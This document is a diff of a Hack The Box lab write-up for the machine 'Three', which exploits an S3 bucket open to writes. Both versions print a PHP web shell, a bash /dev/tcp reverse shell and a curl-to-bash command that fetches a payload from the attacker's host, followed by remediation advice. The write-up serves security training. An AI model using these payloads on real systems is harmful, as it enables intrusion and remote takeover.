@@ -1,136 +1,264 @@
-Machine Name : Three
-Platform : Hackthebox
-difficulty : Very easy
-target IP : 10.129.114.141
+# Hack The Box - Three
 
-- machine about : Three is a very easy Linux machine featuring a website using a **misconfigured AWS S3 bucket** as its cloud-storage device. The machine explores web application enumeration and subdomain fuzzing to detect the hidden domain corresponding to the S3 bucket. Then it showcases using the AWS command line interface to access the vulnerable S3 bucket as well as how to exploit it by uploading and triggering a reverse shell.
+| Property | Value |
+|----------|-------|
+| **Machine** | Three |
+| **Platform** | Hack The Box |
+| **Difficulty** | Very Easy |
+| **Target IP** | `10.129.114.141` |
+| **Operating System** | Linux |
 
-### Enumerating :
+---
 
-- Manually add the host into the `/etc/hosts`
-![[Pasted image 20260722231643.png]]
+## Objective
 
-**The website :**
-![[Pasted image 20260722221721.png|508]]
+Three is a **very easy** Linux machine that demonstrates how a **misconfigured AWS S3 bucket** can lead to **Remote Code Execution (RCE)**. The objective is to enumerate the target website, discover the hidden S3 subdomain, exploit the insecure bucket configuration by uploading a PHP web shell, and obtain remote access to the target system.
 
-**nmap :**
-![[Pasted image 20260722221845.png]]
+---
 
-| Port | State | Service | Version                                                      |
-| ---- | ----- | ------- | ------------------------------------------------------------ |
-| 22   | open  | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) |
-| 80   | open  | http    | Apache httpd 2.4.29 ((Ubuntu))                               |
-**Subdomain :**
-- use the tool `gobuster`
-```
+## Enumeration
+
+### Host Configuration
+
+Since the target uses a name-based virtual host, add the hostname to the local hosts file.
+
+<img width="456" height="214" alt="image" src="https://github.com/user-attachments/assets/0f7cad50-11aa-42b4-bda2-63b5f8b0dd8b" />
+
+
+---
+
+### Website Enumeration
+
+Browse to the target website.
+
+<img width="759" height="450" alt="image" src="https://github.com/user-attachments/assets/063c9429-bbad-4ec7-9a10-85e8b48fa819" />
+
+
+---
+
+### Nmap Scan
+
+Identify the exposed services.
+
+<img width="660" height="256" alt="image" src="https://github.com/user-attachments/assets/9c417549-4b66-4a54-be6b-174d8fc8b388" />
+
+
+| Port | State | Service | Version |
+|------|------|---------|---------|
+| 22 | Open | SSH | OpenSSH 7.6p1 Ubuntu |
+| 80 | Open | HTTP | Apache httpd 2.4.29 (Ubuntu) |
+
+### Analysis
+
+The target exposes an HTTP service and an SSH service. Since no immediate vulnerabilities were identified through version enumeration, further web application enumeration was performed.
+
+---
+
+## Virtual Host Enumeration
+
+Use **Gobuster** to enumerate virtual hosts.
+
+```text
 gobuster vhost \
 -u http://thetoppers.htb \
 -w /home/ashutosh/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
 --append-domain
 ```
-![[Pasted image 20260722230617.png]]
-- visited the s3.thetoppers.htb.
-![[Pasted image 20260723154126.png]]
 
-### Exploitation :
-To intract with the s3 bucket using `awscli` utility.
+<img width="605" height="341" alt="image" src="https://github.com/user-attachments/assets/040ca456-d7a4-408e-b883-58d20595abe8" />
 
-- then configure the aws and listing the hosts and the files in them L
-![[Pasted image 20260723175346.png]]
+
+The scan discovered the hidden virtual host:
+
+```text
+s3.thetoppers.htb
 ```
+
+Visit the newly discovered subdomain.
+
+<img width="554" height="125" alt="image" src="https://github.com/user-attachments/assets/65916361-476d-443b-b563-a7e751e92ad4" />
+
+
+---
+
+## Exploitation
+
+### AWS CLI Enumeration
+
+Interact with the S3-compatible storage using the AWS CLI.
+
+Configure the AWS client.
+
+```text
 aws configure
 ```
-```
+
+List the available buckets.
+
+```text
 aws --endpoint=http://s3.thetoppers.htb s3 ls
 ```
+
+List the contents of the bucket.
+
+```text
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 ```
-aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetopper.htb
+<img width="564" height="245" alt="image" src="https://github.com/user-attachments/assets/6f1ecac0-1512-404b-91b2-cf7a0d086840" />
+
+
+Enumeration confirmed that the bucket contained the website files.
+
+---
+
+### Testing for Remote Code Execution
+
+Create a simple PHP web shell.
+
+```php
+<?php system($_GET["cmd"]); ?>
 ```
 
-**Check if the remote access is possible :**
-- Create a php web shell:
-```
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
-```
-what this code does is : Take whatever is supplied in the URL parameter called `cmd` and pass it to the operating system as a command.
+Save it as:
 
-- upload the `shell.php` file into the web server
+```text
+shell.php
 ```
+
+Upload the file to the bucket.
+
+```text
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 ```
-![[Pasted image 20260723221658.png]]
 
-- try executing the OS command `id` using the URL parameter `cmd` . :
-```
+<img width="648" height="36" alt="image" src="https://github.com/user-attachments/assets/ff93cb58-4845-47a4-85a7-41521965e0e6" />
+
+
+Execute a test command.
+
+```text
 http://thetoppers.htb/shell.php?cmd=id
 ```
-request the `shell.php` page from the target website and pass the value `id` into a URL parameter named `cmd`.
-![[Pasted image 20260723221722.png|542]]
 
-**Create a reverse shell :**
-- create a new file named `shell.sh` containing :
+<img width="698" height="118" alt="image" src="https://github.com/user-attachments/assets/e09b6ed8-6791-427f-94f2-aa2d9893eac1" />
+
+
+The response returned:
+
+```text
+uid=33(www-data)
 ```
+
+confirming successful **Remote Code Execution**.
+
+---
+
+## Reverse Shell
+
+Create a Bash reverse shell.
+
+```bash
 #!/bin/bash
-bash -i >& /dev/tcp/YOUR_IP_ADDRESS/1337 0>&1
+bash -i >& /dev/tcp/<YOUR-IP>/1337 0>&1
 ```
-Start an interactive `-i` Bash shell, create a TCP connection to `10.10.14.74:1337`, send the shell’s output there, and take the shell’s input from that same connection.
 
-**Set a listener :** on the port 1337
-```
+---
+
+### Start a Netcat Listener
+
+```text
 nc -nvlp 1337
 ```
-![[Pasted image 20260723232258.png]]
 
-**Start a temporary HTTP server :**
-```
+<img width="233" height="34" alt="image" src="https://github.com/user-attachments/assets/e825822f-1b50-4724-924b-07ff62b20271" />
+
+
+---
+
+### Host the Payload
+
+Start a temporary HTTP server.
+
+```text
 python3 -m http.server 8000
 ```
-![[Pasted image 20260723233426.png]]
 
-**Execute the Reverse Shell on the Target :**
-```
-http://thetoppers.htb/shell.php?cmd=curl%20http://<YOUR_TUN0_IP>:8000/shell.sh%20%7C%20bash
+<img width="490" height="34" alt="image" src="https://github.com/user-attachments/assets/80a1c4d9-be90-4f19-80e3-19fc3a828541" />
+
+
+---
+
+### Execute the Reverse Shell
+
+Trigger the payload using the PHP web shell.
+
+```text
+http://thetoppers.htb/shell.php?cmd=curl%20http://<YOUR-IP>:8000/shell.sh%20|%20bash
 ```
 
-- check the Netcat terminal for shell access :
-```
+Once the connection is established, retrieve the flag.
+
+```text
 cat /var/www/flag.txt
 ```
-![[Pasted image 20260724214301.png]]
-**Note :** Target IP changed after respawning the HTB instance.
 
-### Risk Severity : Critical
+<img width="633" height="324" alt="image" src="https://github.com/user-attachments/assets/7ed3e295-f066-45e0-8e04-813b0f8e0fda" />
 
-The S3 bucket was misconfigured with insufficient access controls, allowing unauthorized users to upload arbitrary files. Since the bucket was associated with the website's webroot, an uploaded PHP file could be executed by the web server, resulting in Remote Code Execution (RCE).
 
-**Impact :**
+> **Note**
+>
+> The target IP changed after the HTB instance was respawned.
 
-An attacker could exploit the misconfigured S3 bucket to upload malicious server-side files and execute arbitrary operating-system commands on the target.
-In this assessment, a PHP web shell was successfully uploaded and executed, which provided command execution as the www-data user. This access was further used to establish a reverse shell, allowing remote command-line access to the target system and access to sensitive files.
-### Root Cause :
+---
 
-The primary root cause was improper access control on the S3-compatible storage bucket, which allowed unauthorized users to upload files.
-Since the bucket was associated with the website's webroot and PHP files could be processed by the web server, the unrestricted file upload capability resulted in Remote Code Execution.
+## Risk Analysis
 
-### Evidence :
+### Finding: Misconfigured S3 Bucket Leading to Remote Code Execution
 
-- VHOST enumeration discovered the hidden subdomain s3.thetoppers.htb.
-- AWS CLI enumeration revealed the thetoppers.htb bucket containing website files such as index.php, .htaccess, and the images directory.
-- A PHP web shell (shell.php) was successfully uploaded to the S3 bucket.
-- Executing shell.php with the cmd=id parameter returned uid=33(www-data), confirming Remote Code Execution.
-- A reverse shell was successfully established on port 1337 as the www-data user.
-- The target filesystem was accessed and flag.txt was successfully retrieved.
+**Severity:** Critical
 
-### Remediation :
+**Risk**
 
-- Disable unauthorized write access to the S3 bucket.
-- Implement strict bucket policies and follow the principle of least privilege.
-- Prevent executable files such as PHP scripts from being uploaded to web-accessible storage.
-- Separate cloud storage from the executable webroot where possible.
-- Restrict allowed file types when file uploads are required.
-- Regularly review and audit S3 bucket permissions and access policies.
+The S3 bucket permitted unauthorized file uploads and was directly linked to the web server's document root. This allowed arbitrary PHP files to be uploaded and executed.
 
-### Conclusion :
+**Impact**
 
-The target was successfully compromised due to a misconfigured S3 bucket that permitted unauthorized file uploads. A PHP web shell was uploaded into the web-accessible storage and executed through the website, resulting in Remote Code Execution.
-The command execution was then used to establish a reverse shell as the www-data user, providing unauthorized command-line access to the target system and allowing sensitive files, including the challenge flag, to be accessed.
+- Remote Code Execution (RCE)
+- Arbitrary operating system command execution
+- Reverse shell access
+- Unauthorized access to sensitive files
+- Complete compromise of the web application
+
+**Remediation**
+
+- Disable anonymous write access to the S3 bucket.
+- Apply the principle of least privilege to bucket policies.
+- Prevent executable files (such as PHP) from being uploaded.
+- Separate cloud storage from the web server's document root.
+- Restrict uploaded file types.
+- Regularly audit S3 bucket permissions.
+
+---
+
+## Root Cause
+
+The S3-compatible storage bucket was **misconfigured** with insufficient access controls, allowing unauthorized users to upload arbitrary files. Since the uploaded files were stored inside the web server's document root and interpreted by PHP, arbitrary code execution became possible.
+
+---
+
+## Evidence
+
+Successful exploitation was confirmed by:
+
+- Gobuster discovered the hidden virtual host **s3.thetoppers.htb**.
+- AWS CLI enumeration revealed the website bucket.
+- A PHP web shell was successfully uploaded.
+- Executing `shell.php?cmd=id` returned **uid=33(www-data)**.
+- A reverse shell was successfully established.
+- The target filesystem and **flag.txt** were successfully accessed.
+
+---
+
+## Conclusion
+
+The **Three** machine demonstrates how a **misconfigured cloud storage bucket** can lead to complete compromise of a web application. By discovering the hidden S3 bucket, uploading a PHP web shell, and executing arbitrary commands, Remote Code Execution was achieved. The obtained command execution was then leveraged to establish a reverse shell and gain access to sensitive files. This machine highlights the importance of properly securing cloud storage, restricting file uploads, and preventing executable content from being served directly by web applications.
